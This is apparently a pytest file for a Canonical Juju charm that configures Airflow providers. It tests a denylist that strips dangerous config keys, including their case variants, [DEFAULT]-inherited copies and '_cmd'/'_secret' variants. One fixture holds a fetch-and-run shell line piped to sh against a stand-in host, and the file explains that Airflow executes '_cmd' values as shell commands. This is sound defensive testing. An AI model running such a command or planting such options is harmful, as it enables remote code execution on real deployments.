# Copyright 2026 Canonical Ltd.
# See LICENSE file for licensing details.

"""Tests for Layer 2 denylist validation (spec WF029 section 3.2.2 / 3.4)."""

import configparser

import ops
import ops.testing
import pytest

import charm as charm_module
import denylist
from charm import AirflowProviderConfiguratorCharm

GIT_RELATION = "remote-airflow-provider-configurations"
PROVIDER_RELATION = "airflow-provider-configuration"
FILE_PATH_CONFIG = "airflow_provider_configurations_file_path"

# A denied key (core.dags_folder) alongside a benign one; the denied key must be
# dropped and the benign one preserved.
INI_WITH_DENIED_KEY = """\
[core]
dags_folder = /tmp/evil

[gcs]
conn_id = default_gcp
"""


# --------------------------------------------------------------------------- #
# Pure module tests (no charm harness).
# --------------------------------------------------------------------------- #


def test_load_denylist_includes_shipped_keys():
    """The shipped denylist.yaml loads and contains the spec's example key."""
    loaded = denylist.load_denylist()
    assert "core.dags_folder" in loaded
    assert isinstance(loaded, frozenset)


def test_shipped_denylist_entries_are_well_formed():
    """Every shipped entry is a lower-case "section.option" pair.

    Matching lowercases both sides, so an upper-case entry would still work, but
    keeping the file canonical makes it reviewable at a glance (spec 3.2.2 calls
    for team review of this list).
    """
    for entry in denylist.load_denylist():
        assert entry == entry.lower().strip(), entry
        assert entry.count(".") >= 1, entry
        section, option = entry.split(".", 1)
        assert section and option, entry
        # The `_cmd` / `_secret` variants are implied by the suffix rule and must
        # not be listed separately, or the list drifts out of sync with itself.
        assert not option.endswith(denylist.SENSITIVE_VALUE_SUFFIXES), entry


def test_apply_denylist_drops_from_non_sensitive_ini():
    """A denied key is removed from the .ini; a benign key survives."""
    filtered_ini, filtered_sensitive, dropped = denylist.apply_denylist(
        INI_WITH_DENIED_KEY, {}, denylist=frozenset({"core.dags_folder"})
    )

    parser = configparser.RawConfigParser()
    parser.optionxform = str
    parser.read_string(filtered_ini)

    # Denied key gone; its now-empty section removed; benign key untouched.
    assert not parser.has_section("core")
    assert parser.get("gcs", "conn_id") == "default_gcp"
    assert filtered_sensitive == {}
    assert dropped == ["core.dags_folder"]


def test_apply_denylist_drops_from_sensitive_map():
    """A denied key supplied as a sensitive value is dropped; others kept."""
    sensitive = {"core": {"dags_folder": "/tmp/evil", "some_token": "hunter2"}}
    filtered_ini, filtered_sensitive, dropped = denylist.apply_denylist(
        "", sensitive, denylist=frozenset({"core.dags_folder"})
    )

    assert filtered_sensitive == {"core": {"some_token": "hunter2"}}
    assert dropped == ["core.dags_folder"]


def test_apply_denylist_no_match_is_passthrough():
    """With nothing denied, inputs pass through and nothing is dropped."""
    sensitive = {"gcs": {"key": "value"}}
    filtered_ini, filtered_sensitive, dropped = denylist.apply_denylist(
        INI_WITH_DENIED_KEY, sensitive, denylist=frozenset()
    )

    parser = configparser.RawConfigParser()
    parser.optionxform = str
    parser.read_string(filtered_ini)

    assert parser.get("core", "dags_folder") == "/tmp/evil"
    assert filtered_sensitive == {"gcs": {"key": "value"}}
    assert dropped == []


def test_apply_denylist_dedupes_and_sorts_dropped():
    """A key denied in both inputs is reported once; result is sorted."""
    sensitive = {"core": {"plugins_folder": "s"}}
    _, _, dropped = denylist.apply_denylist(
        "[core]\ndags_folder = x\nplugins_folder = y\n",
        sensitive,
        denylist=frozenset({"core.dags_folder", "core.plugins_folder"}),
    )
    assert dropped == ["core.dags_folder", "core.plugins_folder"]


def test_apply_denylist_drops_denied_option_from_default_section():
    """A denied option hidden in [DEFAULT] is really removed, not just reported.

    configparser inherits [DEFAULT] options into every section and refuses to
    remove an inherited option from an individual section, so a naive filter
    reports the drop while write() still emits the value.
    """
    filtered_ini, _, dropped = denylist.apply_denylist(
        "[DEFAULT]\ndags_folder = /tmp/evil\n\n[core]\nparallelism = 32\n",
        {},
        denylist=frozenset({"core.dags_folder"}),
    )

    assert dropped == ["DEFAULT.dags_folder"]
    # The value must be absent from the serialised output, under any section.
    assert "dags_folder" not in filtered_ini
    assert "/tmp/evil" not in filtered_ini

    parser = configparser.RawConfigParser()
    parser.optionxform = str
    parser.read_string(filtered_ini)
    assert not parser.has_option("core", "dags_folder")
    # The benign sibling in the same section survives.
    assert parser.get("core", "parallelism") == "32"


def test_apply_denylist_keeps_section_holding_only_inherited_defaults():
    """A section whose own options were all dropped is removed, defaults aside.

    parser.options() reports inherited defaults too, so the empty-section check
    must look only at a section's own options.
    """
    filtered_ini, _, dropped = denylist.apply_denylist(
        "[DEFAULT]\nparallelism = 32\n\n[core]\ndags_folder = /tmp/evil\n",
        {},
        denylist=frozenset({"core.dags_folder"}),
    )

    assert dropped == ["core.dags_folder"]
    parser = configparser.RawConfigParser()
    parser.optionxform = str
    parser.read_string(filtered_ini)
    # [core] held nothing but the denied key, so it should be gone...
    assert not parser.has_section("core")
    # ...while the untouched default is preserved.
    assert parser.defaults() == {"parallelism": "32"}


@pytest.mark.parametrize(
    "ini",
    [
        "[core]\nDAGS_FOLDER = /tmp/evil\n",
        "[CORE]\ndags_folder = /tmp/evil\n",
        "[Core]\nDags_Folder = /tmp/evil\n",
    ],
)
def test_apply_denylist_matching_is_case_insensitive(ini):
    """Casing must not bypass the denylist.

    Airflow lowercases option names when it reads airflow.cfg, so `DAGS_FOLDER`
    is the very same setting as `dags_folder` and is honoured just the same. A
    case-sensitive denylist would therefore be bypassed with the shift key.
    """
    filtered_ini, _, dropped = denylist.apply_denylist(
        ini, {}, denylist=frozenset({"core.dags_folder"})
    )

    assert len(dropped) == 1
    assert "/tmp/evil" not in filtered_ini


def test_apply_denylist_matching_is_case_insensitive_in_denylist_entry():
    """An upper-case entry in denylist.yaml still matches a lower-case option."""
    _, _, dropped = denylist.apply_denylist(
        "[core]\ndags_folder = /tmp/evil\n", {}, denylist=frozenset({"CORE.DAGS_FOLDER"})
    )

    assert dropped == ["core.dags_folder"]


@pytest.mark.parametrize("suffix", ["_cmd", "_secret"])
def test_apply_denylist_covers_cmd_and_secret_variants(suffix):
    """Denying an option also denies its `_cmd` / `_secret` variants.

    Airflow accepts `<option>_cmd` in place of `<option>` and runs its value as a
    shell command, so leaving the variant open would hand over exactly the code
    execution the bare option was denied for. Layer 1 cannot cover it either: the
    coordinator renders the bare option, so the variant collides with nothing.
    """
    filtered_ini, _, dropped = denylist.apply_denylist(
        f"[core]\ndags_folder{suffix} = /tmp/evil\n",
        {},
        denylist=frozenset({"core.dags_folder"}),
    )

    assert dropped == [f"core.dags_folder{suffix}"]
    assert "/tmp/evil" not in filtered_ini


def test_apply_denylist_covers_cmd_variant_in_default_section():
    """The `_cmd` variant is caught in [DEFAULT] too, where inheritance applies."""
    filtered_ini, _, dropped = denylist.apply_denylist(
        "[DEFAULT]\nDAGS_FOLDER_CMD = /tmp/evil\n\n[core]\nparallelism = 32\n",
        {},
        denylist=frozenset({"core.dags_folder"}),
    )

    assert dropped == ["DEFAULT.DAGS_FOLDER_CMD"]
    assert "/tmp/evil" not in filtered_ini


def test_apply_denylist_covers_cmd_variant_in_sensitive_map():
    """A `_cmd` variant smuggled through the Juju secret is dropped as well."""
    _, filtered_sensitive, dropped = denylist.apply_denylist(
        "",
        {"core": {"dags_folder_cmd": "curl evil.example/x.sh | sh"}},
        denylist=frozenset({"core.dags_folder"}),
    )

    assert filtered_sensitive == {}
    assert dropped == ["core.dags_folder_cmd"]


def test_apply_denylist_suffix_rule_does_not_overreach():
    """An unrelated option that merely ends in `_cmd` is not dropped.

    The suffix only implies a denial when the *base* option is itself denied.
    """
    _, _, dropped = denylist.apply_denylist(
        "[gcs]\nconn_id_cmd = lookup-conn\n", {}, denylist=frozenset({"core.dags_folder"})
    )

    assert dropped == []


# --------------------------------------------------------------------------- #
# Charm-level wiring tests.
# --------------------------------------------------------------------------- #


@pytest.fixture
def context():
    return ops.testing.Context(charm_type=AirflowProviderConfiguratorCharm)


def _container_with_ini(tmp_path, ini_text):
    """A reachable git-sync container with the given .ini mounted at /git/repo."""
    repo_dir = tmp_path / "repo"
    repo_dir.mkdir(exist_ok=True)
    (repo_dir / "providers.ini").write_text(ini_text)
    return ops.testing.Container(
        name="git-sync",
        can_connect=True,
        mounts={"content": ops.testing.Mount(location="/git/repo", source=repo_dir)},
    )


def _git_relation():
    return ops.testing.Relation(
        GIT_RELATION,
        interface="git",
        remote_app_data={
            "repository-url": "https://github.com/example/provider-config",
            "tracking-ref": "main",
        },
    )


def _provider_relation():
    return ops.testing.Relation(PROVIDER_RELATION, interface="airflow_provider_configuration")


def _peer_relation(local_app_data=None):
    return ops.testing.PeerRelation(
        "replicas",
        interface="airflow_provider_configurator_replica",
        local_app_data=local_app_data or {},
    )


def test_denied_key_dropped_and_status_set(context, tmp_path):
    """A denied key is dropped from the published config; unit Active with a message."""
    container = _container_with_ini(tmp_path, INI_WITH_DENIED_KEY)
    git_relation = _git_relation()
    provider_relation = _provider_relation()
    state = ops.testing.State(
        leader=True,
        containers=[container],
        relations=[git_relation, provider_relation],
        config={FILE_PATH_CONFIG: "providers.ini"},
    )

    state_out = context.run(context.on.relation_changed(git_relation), state)

    # Non-blocking: Active, with a message naming the dropped key.
    assert isinstance(state_out.unit_status, ops.ActiveStatus)
    assert "core.dags_folder" in state_out.unit_status.message

    # The published template carries the benign key but not the denied one.
    out_provider = state_out.get_relation(provider_relation.id)
    published = out_provider.local_app_data["provider-configuration"]
    assert "conn_id" in published
    assert "dags_folder" not in published


def test_no_denied_key_is_plain_active(context, tmp_path):
    """Config free of denied keys publishes cleanly with a plain Active status."""
    container = _container_with_ini(tmp_path, "[gcs]\nconn_id = default_gcp\n")
    git_relation = _git_relation()
    provider_relation = _provider_relation()
    state = ops.testing.State(
        leader=True,
        containers=[container],
        relations=[git_relation, provider_relation],
        config={FILE_PATH_CONFIG: "providers.ini"},
    )

    state_out = context.run(context.on.relation_changed(git_relation), state)

    assert state_out.unit_status == ops.ActiveStatus()


def test_dropped_status_survives_dedup(context, tmp_path):
    """On a deduped reconcile (unchanged content) the dropped-keys status persists."""
    container = _container_with_ini(tmp_path, INI_WITH_DENIED_KEY)
    git_relation = _git_relation()
    provider_relation = _provider_relation()
    state = ops.testing.State(
        leader=True,
        containers=[container],
        relations=[git_relation, provider_relation, _peer_relation()],
        config={FILE_PATH_CONFIG: "providers.ini"},
    )

    # First run publishes and stores the content hash.
    state_after_first = context.run(context.on.relation_changed(git_relation), state)
    assert "core.dags_folder" in state_after_first.unit_status.message

    # Second run with the same content dedups the publish, but the status must
    # still name the dropped key (drops are recorded before the dedup).
    state_out = context.run(context.on.update_status(), state_after_first)
    assert isinstance(state_out.unit_status, ops.ActiveStatus)
    assert "core.dags_folder" in state_out.unit_status.message


def test_dropped_key_logged_as_warning(context, tmp_path):
    """Each drop logs a WARNING naming the section, option and the layer (spec 3.4)."""
    container = _container_with_ini(tmp_path, INI_WITH_DENIED_KEY)
    git_relation = _git_relation()
    state = ops.testing.State(
        leader=True,
        containers=[container],
        relations=[git_relation, _provider_relation()],
        config={FILE_PATH_CONFIG: "providers.ini"},
    )

    context.run(context.on.relation_changed(git_relation), state)

    warnings = [line.message for line in context.juju_log if line.level == "WARNING"]
    assert any("core.dags_folder" in message and "Layer 2" in message for message in warnings), (
        warnings
    )


@pytest.mark.parametrize(
    "ini",
    [
        "dags_folder = /tmp/evil\n",  # no section header
        "[core]\nparallelism = 1\nparallelism = 2\n",  # duplicate option
        "[core]\nx = 1\n[core]\ny = 2\n",  # duplicate section
        "<<<<<<< HEAD\nnot ini at all\n",  # unresolved merge conflict
    ],
)
def test_malformed_ini_blocks_instead_of_erroring(context, tmp_path, ini):
    """A file configparser rejects blocks the unit rather than erroring the hook.

    configparser raises on these inputs. Letting that propagate would put the
    unit in Juju's error state and retry the hook forever; a file that cannot be
    parsed is an authoring mistake just like a missing one (spec 1.3), so it
    blocks and waits for the next sync to bring a corrected file.
    """
    container = _container_with_ini(tmp_path, ini)
    git_relation = _git_relation()
    provider_relation = _provider_relation()
    state = ops.testing.State(
        leader=True,
        containers=[container],
        relations=[git_relation, provider_relation],
        config={FILE_PATH_CONFIG: "providers.ini"},
    )

    state_out = context.run(context.on.relation_changed(git_relation), state)

    assert state_out.unit_status == ops.BlockedStatus(charm_module.MALFORMED_CONFIG_FILE_MESSAGE)
    # Nothing half-parsed should have reached the coordinator.
    out_provider = state_out.get_relation(provider_relation.id)
    assert out_provider.local_app_data == {}


def test_malformed_ini_does_not_clear_published_config(context, tmp_path):
    """A file that goes malformed leaves the last good config in place.

    Blocking is the right response, but it must not look like an empty config:
    clearing the databag would make the coordinator drop working provider
    settings because of a typo in a commit (spec 2.2 cleanup is for an *empty*
    config, not one that cannot be read).
    """
    container = _container_with_ini(tmp_path, "[gcs]\nconn_id = default_gcp\n")
    git_relation = _git_relation()
    provider_relation = _provider_relation()
    state = ops.testing.State(
        leader=True,
        containers=[container],
        relations=[git_relation, provider_relation, _peer_relation()],
        config={FILE_PATH_CONFIG: "providers.ini"},
    )

    # Publish a good configuration first.
    state_after_good = context.run(context.on.relation_changed(git_relation), state)
    published = state_after_good.get_relation(provider_relation.id).local_app_data
    assert published.get("provider-configuration")

    # The repository is then updated with a broken file.
    (tmp_path / "repo" / "providers.ini").write_text("<<<<<<< HEAD\nbroken\n")
    state_out = context.run(context.on.update_status(), state_after_good)

    assert state_out.unit_status == ops.BlockedStatus(charm_module.MALFORMED_CONFIG_FILE_MESSAGE)
    assert state_out.get_relation(provider_relation.id).local_app_data == published
